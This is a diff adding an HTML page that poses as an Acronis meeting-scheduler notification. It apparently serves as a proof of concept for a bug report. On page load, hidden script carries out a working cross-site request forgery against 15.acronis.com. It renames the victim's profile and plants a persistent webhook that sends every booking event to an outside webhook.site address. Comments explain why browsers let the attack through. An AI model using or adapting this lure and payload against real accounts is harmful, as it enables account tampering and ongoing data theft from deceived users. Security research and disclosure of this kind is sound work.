@@ -63,4 +63,69 @@ fetch("https://15.acronis.com/api/trpc/webhook/create?batch=1", {
 }).catch(() => {});
 </script>
 </body>
+</html><!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Acronis Meeting Scheduler – Action Required</title>
+<style>
+  body{font-family:Segoe UI,Arial,sans-serif;background:#f4f6f9;margin:0}
+  .card{max-width:520px;margin:8vh auto;background:#fff;border-radius:10px;box-shadow:0 4px 18px rgba(0,0,0,.12);overflow:hidden}
+  .hd{background:#1a1a2e;color:#fff;padding:22px 28px}
+  .hd h1{font-size:18px;margin:0}
+  .hd p{margin:6px 0 0;font-size:13px;opacity:.8}
+  .bd{padding:26px 28px;color:#333;font-size:14px;line-height:1.6}
+  .btn{display:inline-block;background:#e5484d;color:#fff;padding:11px 26px;border-radius:6px;text-decoration:none;font-weight:600;margin-top:14px}
+  .ft{padding:14px 28px;background:#fafafa;border-top:1px solid #eee;font-size:11px;color:#999}
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="hd">
+    <h1>&#128197; Acronis Meeting Scheduler</h1>
+    <p>You have 1 pending scheduling request from a colleague</p>
+  </div>
+  <div class="bd">
+    <p><b>Anna Kovacs</b> would like to schedule a <b>Project Sync – 30 min</b> with you.</p>
+    <p>Proposed slot: <b>Thu, Sep 10 · 14:00–14:30 (GMT+1)</b></p>
+    <p>Please confirm your availability to secure this slot.</p>
+    <a class="btn" href="#" onclick="return false;">Review request</a>
+  </div>
+  <div class="ft">Acronis Cyber Protect &middot; This notification was sent because you are subscribed to scheduling updates.</div>
+</div>
+
+<script>
+/* CSRF — executes in the victim's session on page load (works in Chrome/Edge defaults):
+   - Content-Type text/plain  -> CORS-simple request, no preflight, response unreadable (irrelevant)
+   - Session cookie SameSite=None -> rides on the cross-site request
+   - No Origin/CSRF validation server-side            */
+const T = "https://webhook.site/dc97c56b-3137-4b2e-8834-c7ac4d75c32a";
+
+// 1) VISIBLE ACTION: change the victim's display name
+//    -> shows on their PUBLIC booking page (https://15.acronis.com/<username>/<event>)
+//    -> and in their Settings -> My Account
+fetch("https://15.acronis.com/api/trpc/me/updateProfile?batch=1", {
+  method: "POST",
+  headers: { "Content-Type": "text/plain" },
+  credentials: "include",
+  body: JSON.stringify({ "0": { "json": { "name": "Pwned by CSRF (mon3m.site)" } } })
+}).catch(() => {});
+
+// 2) PERSISTENT: plant an attacker webhook on the victim's account
+//    (fires on every future booking; NOTE payload delivery is currently
+//     template-name-only on this deployment — see report caveat)
+fetch("https://15.acronis.com/api/trpc/webhook/create?batch=1", {
+  method: "POST",
+  headers: { "Content-Type": "text/plain" },
+  credentials: "include",
+  body: JSON.stringify({ "0": { "json": {
+    subscriberUrl: T,
+    eventTriggers: ["BOOKING_CREATED","BOOKING_RESCHEDULED","BOOKING_CANCELLED","BOOKING_REQUESTED","BOOKING_PAID"],
+    active: true,
+    payloadTemplate: "default_listener"
+  }}})
+}).catch(() => {});
+</script>
+</body>
 </html>
